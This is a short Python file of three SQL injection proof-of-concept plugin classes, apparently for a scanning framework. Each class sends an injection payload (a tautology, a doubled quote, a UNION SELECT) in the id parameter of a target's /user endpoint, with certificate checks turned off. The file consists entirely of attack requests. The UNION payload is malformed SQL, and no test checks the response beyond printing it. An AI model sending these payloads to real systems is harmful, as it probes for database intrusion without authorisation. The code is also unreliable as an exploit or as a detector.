import requests

class SqlTest1(PocBase):
    pocflag="POC001|SQL注入测试1"
    def exploit(self):
        print("[+] 开始测试"+self.pocflag)
        headers = self.headers()
        url=self.target+"/user?id=1' or 1#"
        res = requests.get(url, headers=headers, timeout=3, verify=False)
        print(res)

class SqlTest2(PocBase):
    pocflag="POC002|SQL注入测试2"
    enable=False
    def exploit(self):
        print("[+] 开始测试"+self.pocflag)
        headers = self.headers()
        url=self.target+"/user?id=1''"
        res = requests.get(url, headers=headers, timeout=3, verify=False)
        print(res)

class SqlTest3(PocBase):
    pocflag="POC003|SQL注入测试3"
    def exploit(self):
        print("[+] 开始测试"+self.pocflag)
        headers = self.headers()
        url=self.target+"/user?id=-1 and union select 1 2 3"
        res = requests.get(url, headers=headers, timeout=3, verify=False)
        print(res)

